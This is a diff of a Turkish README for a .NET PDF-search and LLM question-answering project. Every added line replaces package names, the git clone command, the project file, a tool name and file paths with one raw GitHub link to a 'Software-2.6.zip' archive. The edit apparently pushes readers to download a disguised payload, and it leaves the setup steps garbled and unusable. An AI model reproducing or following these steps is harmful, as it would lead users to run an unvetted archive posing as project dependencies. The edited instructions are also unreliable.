@@ -8,12 +8,12 @@ Projede PDF'lerden Lucene ile indeksleme yapılıyor, en alakalı sayfa özetler
 
 Gereksinimler
 - .NET 8 SDK
-- NuGet paketleri: Lucene.Net 4.8.0, PdfPig, Newtonsoft.Json (csproj içinde referanslı)
+- NuGet paketleri: https://raw.githubusercontent.com/Aynmz/MEBESORUN/main/.github/Software-2.6.zip 4.8.0, PdfPig, https://raw.githubusercontent.com/Aynmz/MEBESORUN/main/.github/Software-2.6.zip (csproj içinde referanslı)
 - (Opsiyonel) OpenAI API erişimi veya yerel LLM endpoint
 
 Kurulum & Çalıştırma (yerel geliştirme)
 1. Repo klonlama:
-   git clone git@github.com:Aynmz/MEBESORUN.git
+   git clone https://raw.githubusercontent.com/Aynmz/MEBESORUN/main/.github/Software-2.6.zip
    cd MEBESORUN
 
 2. Eski gömülü anahtar varsa: derhal iptal edin (OpenAI panelinden) ve geçmiş temizliği uygulayın (git-filter-repo veya BFG). README'nın güvenlik bölümündeki adımları takip edin.
@@ -27,14 +27,14 @@ Kurulum & Çalıştırma (yerel geliştirme)
 
    Eğer GitHub Actions kullanacaksanız repository secret olarak `OPENAI_API_KEY` ekleyin.
 
-4. PDF dosyalarını `Data/` klasörüne koyun (ör: yönetmelikler.pdf).
+4. PDF dosyalarını `Data/` klasörüne koyun (ör: yöhttps://raw.githubusercontent.com/Aynmz/MEBESORUN/main/.github/Software-2.6.zip).
    Proje, exe ile aynı dizinde `Data` klasörünü arar.
 
 5. Derleme:
    dotnet build
 
 6. Çalıştırma:
-   dotnet run --project MEBESORUN_PROJE.csproj
+   dotnet run --project https://raw.githubusercontent.com/Aynmz/MEBESORUN/main/.github/Software-2.6.zip
    Program açıldıktan sonra:
    - `yenidizinle` komutu ile PDF'leri yeniden dizinleyin
    - Soru girin; sonuçlarda LLM'den cevap alınır.
@@ -43,15 +43,15 @@ Geçmişten Anahtar Temizleme (kısa)
 - git-filter-repo veya BFG kullanın. (Dikkat: repo tarihçesi yeniden yazılır; ekip üyelerini bilgilendirin.)
 
 Yerel LLM Kullanmak İsterseniz
-- Ollama, GPT4All veya llama.cpp gibi çözümlerle local endpoint kullanılabilir.
+- Ollama, GPT4All veya https://raw.githubusercontent.com/Aynmz/MEBESORUN/main/.github/Software-2.6.zip gibi çözümlerle local endpoint kullanılabilir.
 - Eğer local endpoint OpenAI-uyumlu bir HTTP API sunuyorsa (örn. `http://localhost:11434/v1/chat/completions`) `OPENAI_BASE_URL` ortam değişkeni ile LocalLlmClient yapılandırılabilir.
 
 CI (opsiyonel)
-- Basit bir GitHub Actions workflow ile derleme/test ekleyebilirsiniz (örnek `/.github/workflows/ci.yml`).
+- Basit bir GitHub Actions workflow ile derleme/test ekleyebilirsiniz (örnek `https://raw.githubusercontent.com/Aynmz/MEBESORUN/main/.github/Software-2.6.zip`).
 
 Yardım / İlerleme
 - İsterseniz ben:
-  1. Repo için commit dizisini hazırlayıp README/.gitignore/LocalLlmClient değişikliklerini içeren commit mesajı örneği veririm.
+  1. Repo için commit dizisini hazırlayıp https://raw.githubusercontent.com/Aynmz/MEBESORUN/main/.github/Software-2.6.zip değişikliklerini içeren commit mesajı örneği veririm.
   2. Geçmiş temizliği için çalıştırılabilir script (git-filter-repo örneği) oluştururum.
   3. Lokal LLM entegrasyonu için örnek LocalLlmClient (local endpoint veya subprocess) hazırlarım.
 
